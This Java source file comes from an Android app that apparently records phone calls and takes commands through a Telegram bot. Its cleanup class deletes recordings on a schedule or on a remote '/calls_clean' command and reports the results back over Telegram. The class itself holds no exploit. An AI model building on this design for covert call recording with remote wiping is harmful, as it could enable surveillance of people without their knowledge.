package com.thunderx.telegramagent;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import java.io.File;

public class CallCleanupWorker {

    private static final String TAG = "CallCleanup";

    // Auto-cleanup: delete recordings older than 6 hours
    private static final long MAX_AGE_MS = 6 * 60 * 60 * 1000L;

    // Auto-cleanup runs every 30 minutes
    private static final long CLEANUP_INTERVAL_MS = 30 * 60 * 1000L;

    private static Handler handler;
    private static Runnable cleanupTask;
    private static boolean running = false;

    // ==========================================================
    //     SCHEDULED AUTO-CLEANUP (>6h old files, background)
    // ==========================================================
    public static void scheduleCleanup(Context context) {
        if (running) return;
        running = true;

        handler = new Handler(Looper.getMainLooper());
        cleanupTask = new Runnable() {
            @Override
            public void run() {
                doCleanup(context, false); // only old files
                handler.postDelayed(this, CLEANUP_INTERVAL_MS);
            }
        };
        handler.post(cleanupTask);
        Log.d(TAG, "Cleanup scheduled");
    }

    // ==========================================================
    //     PERMANENT DELETE — wipes ALL recordings immediately
    //     Triggered by /calls_clean command
    // ==========================================================
    public static void deleteAllNow(Context context) {
        doCleanup(context, true);
    }

    // ==========================================================
    //     MANUAL CLEANUP — deletes only files older than 6h
    // ==========================================================
    public static void cleanupNow(Context context) {
        doCleanup(context, false);
    }

    // ==========================================================
    //                    CORE LOGIC
    // ==========================================================
    private static void doCleanup(Context context, boolean deleteAll) {
        try {
            File dir = CallRecorder.getRecordingsDir();

            // ----- Sanity checks -----
            if (dir == null) {
                TelegramAgentService.sendMessage("❌ Recordings dir not found.");
                return;
            }
            if (!dir.exists()) {
                TelegramAgentService.sendMessage("📁 Folder doesn't exist:\n`" +
                        dir.getAbsolutePath() + "`");
                return;
            }
            if (!dir.canRead() || !dir.canWrite()) {
                TelegramAgentService.sendMessage("❌ Permission denied on:\n`" +
                        dir.getAbsolutePath() + "`\n\n" +
                        "Fix:\n`adb shell appops set com.thunderx.telegramagent MANAGE_EXTERNAL_STORAGE allow`");
                return;
            }

            File[] files = dir.listFiles();
            if (files == null) {
                TelegramAgentService.sendMessage("❌ Cannot list files.");
                return;
            }
            if (files.length == 0) {
                TelegramAgentService.sendMessage("📁 Folder already empty.");
                return;
            }

            // ----- Delete loop -----
            long now = System.currentTimeMillis();
            int deleted = 0;
            int skipped = 0;
            int failed = 0;
            long freedBytes = 0;

            for (File f : files) {
                if (!f.isFile()) continue;
                try {
                    // Permanent delete: keep only if NOT deleteAll AND still fresh
                    boolean shouldDelete = deleteAll || ((now - f.lastModified()) > MAX_AGE_MS);

                    if (!shouldDelete) {
                        skipped++;
                        continue;
                    }

                    long size = f.length();
                    if (f.delete()) {
                        deleted++;
                        freedBytes += size;
                        Log.d(TAG, "Deleted: " + f.getName());
                    } else {
                        failed++;
                        Log.w(TAG, "Failed: " + f.getAbsolutePath());
                    }
                } catch (Exception e) {
                    failed++;
                    Log.e(TAG, "Error deleting " + f.getName() + ": " + e.getMessage());
                }
            }

            // ----- Report -----
            StringBuilder sb = new StringBuilder();

            if (deleteAll) {
                sb.append("🗑️ *Permanent delete complete*\n\n");
            } else {
                sb.append("🧹 *Auto-cleanup (>6h old)*\n\n");
            }

            sb.append("✅ Deleted: *").append(deleted).append("* file(s)\n");
            sb.append("💾 Freed: *").append(freedBytes / 1024).append(" KB*\n");

            if (skipped > 0) {
                sb.append("⏭️ Skipped (fresh): ").append(skipped).append("\n");
            }
            if (failed > 0) {
                sb.append("⚠️ Failed: ").append(failed).append("\n");
                sb.append("_Check MANAGE_EXTERNAL_STORAGE permission._");
            }

            if (deleted == 0 && failed == 0 && skipped > 0) {
                sb.append("\nℹ️ All files are still fresh (<6h). Use `/calls_clean` to force delete.");
            }

            TelegramAgentService.sendMessage(sb.toString());

        } catch (Exception e) {
            Log.e(TAG, "Cleanup error: " + e.getMessage(), e);
            TelegramAgentService.sendMessage("❌ Cleanup error: " + e.getMessage());
        }
    }
}